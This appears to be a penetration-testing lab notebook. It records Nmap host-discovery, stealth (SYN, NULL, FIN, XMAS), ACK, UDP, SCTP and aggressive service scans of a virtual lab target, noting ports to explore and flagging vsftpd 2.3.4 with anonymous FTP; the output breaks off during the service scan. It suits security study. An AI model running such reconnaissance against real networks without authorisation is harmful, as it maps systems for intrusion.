Discovered open port 5432/tcp on 10.0.2.9
Discovered open port 2121/tcp on 10.0.2.9
Discovered open port 49152/tcp on 10.0.2.2
Discovered open port 513/tcp on 10.0.2.9
Discovered open port 631/tcp on 10.0.2.2
Discovered open port 6000/tcp on 10.0.2.9
Discovered open port 1524/tcp on 10.0.2.9
Discovered open port 8009/tcp on 10.0.2.9
Discovered open port 514/tcp on 10.0.2.9
Discovered open port 8180/tcp on 10.0.2.9
Discovered open port 6667/tcp on 10.0.2.9
Discovered open port 512/tcp on 10.0.2.9
Completed SYN Stealth Scan against 10.0.2.2 in 0.24s (3 hosts left)
Completed SYN Stealth Scan against 10.0.2.3 in 0.24s (2 hosts left)
Discovered open port 1099/tcp on 10.0.2.9
Discovered open port 2049/tcp on 10.0.2.9
Completed SYN Stealth Scan against 10.0.2.1 in 0.24s (1 host left)
Completed SYN Stealth Scan at 14:35, 0.24s elapsed (4000 total ports)
Nmap scan report for 10.0.2.1
Host is up (0.00049s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)

Nmap scan report for 10.0.2.2
Host is up (0.00043s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE
631/tcp   open  ipp
49152/tcp open  unknown
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)

Nmap scan report for 10.0.2.3
Host is up (0.00027s latency).
All 1000 scanned ports on 10.0.2.3 are filtered
MAC Address: 08:00:27:69:D5:4D (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.9
Host is up (0.00035s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Initiating SYN Stealth Scan at 14:35
Scanning 10.0.2.8 [1000 ports]
Completed SYN Stealth Scan at 14:35, 0.05s elapsed (1000 total ports)
Nmap scan report for 10.0.2.8
Host is up (0.0000030s latency).
All 1000 scanned ports on 10.0.2.8 are closed

Read data files from: /usr/bin/../share/nmap
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.96 seconds
           Raw packets sent: 5511 (234.308KB) | Rcvd: 6009 (260.356KB)

```
---
### Default scan, TCP SYN SCAN, TCP Connect SCAN 
```
nmap -v4 10.0.2.9 (= nmap -v4 -sS 10.0.2.9 = nmap -v4 -sT 10.0.2.9 )   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 12:26 CEST
Initiating ARP Ping Scan at 12:26
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:26, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:26
Completed Parallel DNS resolution of 1 host. at 12:26, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:26
Scanning 10.0.2.9 [1000 ports]
Discovered open port 53/tcp on 10.0.2.9
Discovered open port 25/tcp on 10.0.2.9
Discovered open port 23/tcp on 10.0.2.9
Discovered open port 80/tcp on 10.0.2.9
Discovered open port 111/tcp on 10.0.2.9
Discovered open port 445/tcp on 10.0.2.9
Discovered open port 139/tcp on 10.0.2.9
Discovered open port 5900/tcp on 10.0.2.9
Discovered open port 3306/tcp on 10.0.2.9
Discovered open port 22/tcp on 10.0.2.9
Discovered open port 21/tcp on 10.0.2.9
Discovered open port 512/tcp on 10.0.2.9
Discovered open port 2049/tcp on 10.0.2.9
Discovered open port 5432/tcp on 10.0.2.9
Discovered open port 2121/tcp on 10.0.2.9
Discovered open port 1099/tcp on 10.0.2.9
Discovered open port 8180/tcp on 10.0.2.9
Discovered open port 6000/tcp on 10.0.2.9
Discovered open port 6667/tcp on 10.0.2.9
Discovered open port 514/tcp on 10.0.2.9
Discovered open port 8009/tcp on 10.0.2.9
Discovered open port 513/tcp on 10.0.2.9
Discovered open port 1524/tcp on 10.0.2.9
Completed SYN Stealth Scan at 12:26, 0.08s elapsed (1000 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00015s latency).
Scanned at 2021-10-18 12:26:49 CEST for 0s
Not shown: 977 closed ports
Reason: 977 resets
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 64
22/tcp   open  ssh          syn-ack ttl 64
23/tcp   open  telnet       syn-ack ttl 64
25/tcp   open  smtp         syn-ack ttl 64
53/tcp   open  domain       syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
111/tcp  open  rpcbind      syn-ack ttl 64
139/tcp  open  netbios-ssn  syn-ack ttl 64
445/tcp  open  microsoft-ds syn-ack ttl 64
512/tcp  open  exec         syn-ack ttl 64
513/tcp  open  login        syn-ack ttl 64
514/tcp  open  shell        syn-ack ttl 64
1099/tcp open  rmiregistry  syn-ack ttl 64
1524/tcp open  ingreslock   syn-ack ttl 64
2049/tcp open  nfs          syn-ack ttl 64
2121/tcp open  ccproxy-ftp  syn-ack ttl 64
3306/tcp open  mysql        syn-ack ttl 64
5432/tcp open  postgresql   syn-ack ttl 64
5900/tcp open  vnc          syn-ack ttl 64
6000/tcp open  X11          syn-ack ttl 64
6667/tcp open  irc          syn-ack ttl 64
8009/tcp open  ajp13        syn-ack ttl 64
8180/tcp open  unknown      syn-ack ttl 64
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.120KB)
```
---
### TCP NULL scan
```
nmap -v4 -sN 10.0.2.9
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 12:41 CEST
Initiating ARP Ping Scan at 12:41
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:41, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:41
Completed Parallel DNS resolution of 1 host. at 12:41, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating NULL Scan at 12:41
Scanning 10.0.2.9 [1000 ports]
Completed NULL Scan at 12:41, 1.25s elapsed (1000 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00024s latency).
Scanned at 2021-10-18 12:41:05 CEST for 1s
Not shown: 977 closed ports
Reason: 977 resets
PORT     STATE         SERVICE      REASON
21/tcp   open|filtered ftp          no-response
22/tcp   open|filtered ssh          no-response
23/tcp   open|filtered telnet       no-response
25/tcp   open|filtered smtp         no-response
53/tcp   open|filtered domain       no-response
80/tcp   open|filtered http         no-response
111/tcp  open|filtered rpcbind      no-response
139/tcp  open|filtered netbios-ssn  no-response
445/tcp  open|filtered microsoft-ds no-response
512/tcp  open|filtered exec         no-response
513/tcp  open|filtered login        no-response
514/tcp  open|filtered shell        no-response
1099/tcp open|filtered rmiregistry  no-response
1524/tcp open|filtered ingreslock   no-response
2049/tcp open|filtered nfs          no-response
2121/tcp open|filtered ccproxy-ftp  no-response
3306/tcp open|filtered mysql        no-response
5432/tcp open|filtered postgresql   no-response
5900/tcp open|filtered vnc          no-response
6000/tcp open|filtered X11          no-response
6667/tcp open|filtered irc          no-response
8009/tcp open|filtered ajp13        no-response
8180/tcp open|filtered unknown      no-response
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
           Raw packets sent: 1024 (40.948KB) | Rcvd: 979 (39.204KB)

```
---
### TCP FIN scan
```
nmap -v4 -sF 10.0.2.9
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 12:43 CEST
Initiating ARP Ping Scan at 12:43
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:43, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:43
Completed Parallel DNS resolution of 1 host. at 12:43, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating FIN Scan at 12:43
Scanning 10.0.2.9 [1000 ports]
Completed FIN Scan at 12:43, 1.24s elapsed (1000 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00019s latency).
Scanned at 2021-10-18 12:43:20 CEST for 1s
Not shown: 977 closed ports
Reason: 977 resets
PORT     STATE         SERVICE      REASON
21/tcp   open|filtered ftp          no-response
22/tcp   open|filtered ssh          no-response
23/tcp   open|filtered telnet       no-response
25/tcp   open|filtered smtp         no-response
53/tcp   open|filtered domain       no-response
80/tcp   open|filtered http         no-response
111/tcp  open|filtered rpcbind      no-response
139/tcp  open|filtered netbios-ssn  no-response
445/tcp  open|filtered microsoft-ds no-response
512/tcp  open|filtered exec         no-response
513/tcp  open|filtered login        no-response
514/tcp  open|filtered shell        no-response
1099/tcp open|filtered rmiregistry  no-response
1524/tcp open|filtered ingreslock   no-response
2049/tcp open|filtered nfs          no-response
2121/tcp open|filtered ccproxy-ftp  no-response
3306/tcp open|filtered mysql        no-response
5432/tcp open|filtered postgresql   no-response
5900/tcp open|filtered vnc          no-response
6000/tcp open|filtered X11          no-response
6667/tcp open|filtered irc          no-response
8009/tcp open|filtered ajp13        no-response
8180/tcp open|filtered unknown      no-response
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
           Raw packets sent: 1024 (40.948KB) | Rcvd: 979 (39.164KB)
```
---
### XMAS scan
```
nmap -v4 -sX 10.0.2.9
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 12:44 CEST
Initiating ARP Ping Scan at 12:44
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:44, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:44
Completed Parallel DNS resolution of 1 host. at 12:44, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating XMAS Scan at 12:44
Scanning 10.0.2.9 [1000 ports]
Completed XMAS Scan at 12:44, 1.24s elapsed (1000 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00014s latency).
Scanned at 2021-10-18 12:44:12 CEST for 1s
Not shown: 977 closed ports
Reason: 977 resets
PORT     STATE         SERVICE      REASON
21/tcp   open|filtered ftp          no-response
22/tcp   open|filtered ssh          no-response
23/tcp   open|filtered telnet       no-response
25/tcp   open|filtered smtp         no-response
53/tcp   open|filtered domain       no-response
80/tcp   open|filtered http         no-response
111/tcp  open|filtered rpcbind      no-response
139/tcp  open|filtered netbios-ssn  no-response
445/tcp  open|filtered microsoft-ds no-response
512/tcp  open|filtered exec         no-response
513/tcp  open|filtered login        no-response
514/tcp  open|filtered shell        no-response
1099/tcp open|filtered rmiregistry  no-response
1524/tcp open|filtered ingreslock   no-response
2049/tcp open|filtered nfs          no-response
2121/tcp open|filtered ccproxy-ftp  no-response
3306/tcp open|filtered mysql        no-response
5432/tcp open|filtered postgresql   no-response
5900/tcp open|filtered vnc          no-response
6000/tcp open|filtered X11          no-response
6667/tcp open|filtered irc          no-response
8009/tcp open|filtered ajp13        no-response
8180/tcp open|filtered unknown      no-response
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds
           Raw packets sent: 1024 (40.948KB) | Rcvd: 980 (39.220KB)

```
---
### TCP ACK scan (= TCP Window scan = TCP Maimon scan)
```
nmap -v4 -sA 10.0.2.9 (=-sW = -sM)
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 12:46 CEST
Initiating ARP Ping Scan at 12:46
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:46, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:46
Completed Parallel DNS resolution of 1 host. at 12:46, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating ACK Scan at 12:46
Scanning 10.0.2.9 [1000 ports]
Completed ACK Scan at 12:46, 0.07s elapsed (1000 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00056s latency).
All 1000 scanned ports on 10.0.2.9 are unfiltered because of 1000 resets
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
           Raw packets sent: 1001 (40.028KB) | Rcvd: 1001 (40.028KB)

```
---
### UDP scan (very long!)
```
nmap -v4 -sU 10.0.2.9 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 12:30 CEST
Initiating ARP Ping Scan at 12:30
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:30, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:30
Completed Parallel DNS resolution of 1 host. at 12:30, 0.08s elapsed
DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating UDP Scan at 12:30
Scanning 10.0.2.9 [1000 ports]
Increasing send delay for 10.0.2.9 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.0.2.9 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.0.2.9 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.0.2.9 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.0.2.9 from 400 to 800 due to max_successful_tryno increase to 8
UDP Scan Timing: About 4.01% done; ETC: 12:43 (0:12:22 remaining)
UDP Scan Timing: About 6.97% done; ETC: 12:45 (0:13:34 remaining)
Discovered open port 53/udp on 10.0.2.9
UDP Scan Timing: About 23.19% done; ETC: 12:47 (0:12:48 remaining)
UDP Scan Timing: About 29.80% done; ETC: 12:47 (0:11:56 remaining)
UDP Scan Timing: About 34.35% done; ETC: 12:47 (0:11:01 remaining)
UDP Scan Timing: About 40.55% done; ETC: 12:48 (0:10:08 remaining)
UDP Scan Timing: About 45.89% done; ETC: 12:48 (0:09:17 remaining)
UDP Scan Timing: About 52.06% done; ETC: 12:48 (0:08:21 remaining)
UDP Scan Timing: About 57.07% done; ETC: 12:48 (0:07:28 remaining)
UDP Scan Timing: About 62.20% done; ETC: 12:48 (0:06:34 remaining)
UDP Scan Timing: About 67.54% done; ETC: 12:48 (0:05:39 remaining)
UDP Scan Timing: About 72.84% done; ETC: 12:48 (0:04:46 remaining)
UDP Scan Timing: About 77.85% done; ETC: 12:48 (0:03:52 remaining)
UDP Scan Timing: About 82.98% done; ETC: 12:48 (0:02:59 remaining)
UDP Scan Timing: About 88.27% done; ETC: 12:48 (0:02:03 remaining)
UDP Scan Timing: About 93.40% done; ETC: 12:48 (0:01:09 remaining)
Completed UDP Scan at 12:49, 1084.67s elapsed (1000 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00053s latency).
Scanned at 2021-10-18 12:30:57 CEST for 1084s
Not shown: 993 closed ports
Reason: 993 port-unreaches
PORT     STATE         SERVICE     REASON
53/udp   open          domain      udp-response ttl 64
68/udp   open|filtered dhcpc       no-response
69/udp   open|filtered tftp        no-response
111/udp  open|filtered rpcbind     no-response
137/udp  open|filtered netbios-ns  no-response
138/udp  open|filtered netbios-dgm no-response
2049/udp open|filtered nfs         no-response
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1084.95 seconds
           Raw packets sent: 1448 (65.883KB) | Rcvd: 7012 (315.333KB)
```
---
### SCTP INIT scan
```
nmap -v4 -sY 10.0.2.9
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 12:37 CEST
Initiating ARP Ping Scan at 12:37
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:37, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:37
Completed Parallel DNS resolution of 1 host. at 12:37, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SCTP INIT Scan at 12:37
Scanning 10.0.2.9 [52 ports]
Completed SCTP INIT Scan at 12:37, 2.05s elapsed (52 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00034s latency).
Scanned at 2021-10-18 12:37:33 CEST for 2s

PORT       STATE    SERVICE         REASON
7/sctp     filtered echo            no-response
9/sctp     filtered discard         no-response
20/sctp    filtered ftp-data        no-response
21/sctp    filtered ftp             no-response
22/sctp    filtered ssh             no-response
80/sctp    filtered http            no-response
179/sctp   filtered bgp             no-response
443/sctp   filtered https           no-response
1167/sctp  filtered cisco-ipsla     no-response
1812/sctp  filtered radius          no-response
1813/sctp  filtered radacct         no-response
2049/sctp  filtered nfs             no-response
2225/sctp  filtered rcip-itu        no-response
2427/sctp  filtered mgcp-gateway    proto-unreach ttl 64
2904/sctp  filtered m2ua            no-response
2905/sctp  filtered m3ua            no-response
2944/sctp  filtered megaco-h248     no-response
2945/sctp  filtered h248-binary     no-response
3097/sctp  filtered itu-bicc-stc    no-response
3565/sctp  filtered m2pa            no-response
3863/sctp  filtered asap-sctp       no-response
3864/sctp  filtered asap-sctp-tls   no-response
3868/sctp  filtered diameter        no-response
4739/sctp  filtered ipfix           no-response
4740/sctp  filtered ipfixs          no-response
5060/sctp  filtered sip             no-response
5061/sctp  filtered sip-tls         no-response
5090/sctp  filtered car             no-response
5091/sctp  filtered cxtp            no-response
5672/sctp  filtered amqp            no-response
5675/sctp  filtered v5ua            no-response
6704/sctp  filtered frc-hp          no-response
6705/sctp  filtered frc-mp          no-response
6706/sctp  filtered frc-lp          no-response
7626/sctp  filtered simco           no-response
8471/sctp  filtered pim-port        no-response
9082/sctp  filtered lcs-ap          no-response
9084/sctp  filtered aurora          no-response
9899/sctp  filtered sctp-tunneling  no-response
9900/sctp  filtered iua             proto-unreach ttl 64
9901/sctp  filtered enrp-sctp       no-response
9902/sctp  filtered enrp-sctp-tls   no-response
11997/sctp filtered wmereceiving    no-response
11998/sctp filtered wmedistribution no-response
11999/sctp filtered wmereporting    no-response
14001/sctp filtered sua             no-response
20049/sctp filtered nfsrdma         no-response
29118/sctp filtered sgsap           no-response
29168/sctp filtered sbcap           no-response
29169/sctp filtered iuhsctpassoc    no-response
36412/sctp filtered s1-control      no-response
36422/sctp filtered x2-control      no-response
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.25 seconds
           Raw packets sent: 104 (5.384KB) | Rcvd: 4 (244B)

```
---
### SCTP COOKIE ECHO scan
```
nmap -v4 -sZ 10.0.2.9
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 12:48 CEST
Initiating ARP Ping Scan at 12:48
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:48, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:48
Completed Parallel DNS resolution of 1 host. at 12:48, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SCTP COOKIE-ECHO Scan at 12:48
Scanning 10.0.2.9 [52 ports]
Completed SCTP COOKIE-ECHO Scan at 12:48, 2.06s elapsed (52 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00034s latency).
Scanned at 2021-10-18 12:48:23 CEST for 2s

PORT       STATE         SERVICE         REASON
7/sctp     filtered      echo            proto-unreach ttl 64
9/sctp     open|filtered discard         no-response
20/sctp    open|filtered ftp-data        no-response
21/sctp    open|filtered ftp             no-response
22/sctp    open|filtered ssh             no-response
80/sctp    open|filtered http            no-response
179/sctp   open|filtered bgp             no-response
443/sctp   open|filtered https           no-response
1167/sctp  open|filtered cisco-ipsla     no-response
1812/sctp  open|filtered radius          no-response
1813/sctp  open|filtered radacct         no-response
2049/sctp  open|filtered nfs             no-response
2225/sctp  open|filtered rcip-itu        no-response
2427/sctp  open|filtered mgcp-gateway    no-response
2904/sctp  open|filtered m2ua            no-response
2905/sctp  filtered      m3ua            proto-unreach ttl 64
2944/sctp  open|filtered megaco-h248     no-response
2945/sctp  open|filtered h248-binary     no-response
3097/sctp  open|filtered itu-bicc-stc    no-response
3565/sctp  open|filtered m2pa            no-response
3863/sctp  filtered      asap-sctp       proto-unreach ttl 64
3864/sctp  open|filtered asap-sctp-tls   no-response
3868/sctp  open|filtered diameter        no-response
4739/sctp  open|filtered ipfix           no-response
4740/sctp  open|filtered ipfixs          no-response
5060/sctp  open|filtered sip             no-response
5061/sctp  open|filtered sip-tls         no-response
5090/sctp  open|filtered car             no-response
5091/sctp  open|filtered cxtp            no-response
5672/sctp  open|filtered amqp            no-response
5675/sctp  open|filtered v5ua            no-response
6704/sctp  open|filtered frc-hp          no-response
6705/sctp  open|filtered frc-mp          no-response
6706/sctp  open|filtered frc-lp          no-response
7626/sctp  open|filtered simco           no-response
8471/sctp  open|filtered pim-port        no-response
9082/sctp  open|filtered lcs-ap          no-response
9084/sctp  open|filtered aurora          no-response
9899/sctp  open|filtered sctp-tunneling  no-response
9900/sctp  open|filtered iua             no-response
9901/sctp  open|filtered enrp-sctp       no-response
9902/sctp  open|filtered enrp-sctp-tls   no-response
11997/sctp open|filtered wmereceiving    no-response
11998/sctp open|filtered wmedistribution no-response
11999/sctp open|filtered wmereporting    no-response
14001/sctp open|filtered sua             no-response
20049/sctp open|filtered nfsrdma         no-response
29118/sctp open|filtered sgsap           no-response
29168/sctp open|filtered sbcap           no-response
29169/sctp open|filtered iuhsctpassoc    no-response
36412/sctp open|filtered s1-control      no-response
36422/sctp open|filtered x2-control      no-response
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
           Raw packets sent: 103 (4.108KB) | Rcvd: 5 (288B)

```
### Potential ports to explore:
22 tcp ports:
```
21/tcp   open  ftp          syn-ack ttl 64
22/tcp   open  ssh          syn-ack ttl 64
23/tcp   open  telnet       syn-ack ttl 64
25/tcp   open  smtp         syn-ack ttl 64
53/tcp   open  domain       syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
111/tcp  open  rpcbind      syn-ack ttl 64
139/tcp  open  netbios-ssn  syn-ack ttl 64
445/tcp  open  microsoft-ds syn-ack ttl 64
512/tcp  open  exec         syn-ack ttl 64
513/tcp  open  login        syn-ack ttl 64
514/tcp  open  shell        syn-ack ttl 64
1099/tcp open  rmiregistry  syn-ack ttl 64
1524/tcp open  ingreslock   syn-ack ttl 64
2049/tcp open  nfs          syn-ack ttl 64
2121/tcp open  ccproxy-ftp  syn-ack ttl 64
3306/tcp open  mysql        syn-ack ttl 64
5432/tcp open  postgresql   syn-ack ttl 64
5900/tcp open  vnc          syn-ack ttl 64
6000/tcp open  X11          syn-ack ttl 64
6667/tcp open  irc          syn-ack ttl 64
8009/tcp open  ajp13        syn-ack ttl 64
8180/tcp open  unknown      syn-ack ttl 64
```
6 udp ports:
```
53/udp   open          domain      udp-response ttl 64
68/udp   open|filtered dhcpc       no-response
69/udp   open|filtered tftp        no-response
111/udp  open|filtered rpcbind     no-response
137/udp  open|filtered netbios-ns  no-response
138/udp  open|filtered netbios-dgm no-response
2049/udp open|filtered nfs         no-response
```
5 sctp ports:
```
2427/sctp  filtered mgcp-gateway    proto-unreach ttl 64
9900/sctp  filtered iua             proto-unreach ttl 64
7/sctp     filtered      echo            proto-unreach ttl 64
2905/sctp  filtered      m3ua            proto-unreach ttl 64
3863/sctp  filtered      asap-sctp       proto-unreach ttl 64
```

### Aggressively scan
```
nmap -v4 -A 10.0.2.9
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 13:14 CEST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
Initiating ARP Ping Scan at 13:14
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 13:14, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:14
Completed Parallel DNS resolution of 1 host. at 13:14, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 13:14
Scanning 10.0.2.9 [1000 ports]
Discovered open port 445/tcp on 10.0.2.9
Discovered open port 53/tcp on 10.0.2.9
Discovered open port 3306/tcp on 10.0.2.9
Discovered open port 23/tcp on 10.0.2.9
Discovered open port 80/tcp on 10.0.2.9
Discovered open port 25/tcp on 10.0.2.9
Discovered open port 111/tcp on 10.0.2.9
Discovered open port 22/tcp on 10.0.2.9
Discovered open port 21/tcp on 10.0.2.9
Discovered open port 139/tcp on 10.0.2.9
Discovered open port 5900/tcp on 10.0.2.9
Discovered open port 8180/tcp on 10.0.2.9
Discovered open port 2049/tcp on 10.0.2.9
Discovered open port 5432/tcp on 10.0.2.9
Discovered open port 1099/tcp on 10.0.2.9
Discovered open port 1524/tcp on 10.0.2.9
Discovered open port 512/tcp on 10.0.2.9
Discovered open port 6000/tcp on 10.0.2.9
Discovered open port 8009/tcp on 10.0.2.9
Discovered open port 513/tcp on 10.0.2.9
Discovered open port 2121/tcp on 10.0.2.9
Discovered open port 514/tcp on 10.0.2.9
Discovered open port 6667/tcp on 10.0.2.9
Completed SYN Stealth Scan at 13:14, 0.10s elapsed (1000 total ports)
Initiating Service scan at 13:14
Scanning 23 services on 10.0.2.9
Completed Service scan at 13:15, 11.03s elapsed (23 services on 1 host)
Initiating OS detection (try #1) against 10.0.2.9
NSE: Script scanning 10.0.2.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:15
NSE: [ftp-bounce 10.0.2.9:21] PORT response: 500 Illegal PORT command.
Completed NSE at 13:15, 9.68s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.35s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00036s latency).
Scanned at 2021-10-18 13:14:52 CEST for 22s
Not shown: 977 closed ports
Reason: 977 resets
PORT     STATE SERVICE     REASON         VERSION

21/tcp   open  ftp         syn-ack ttl 64 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.2.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status

22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
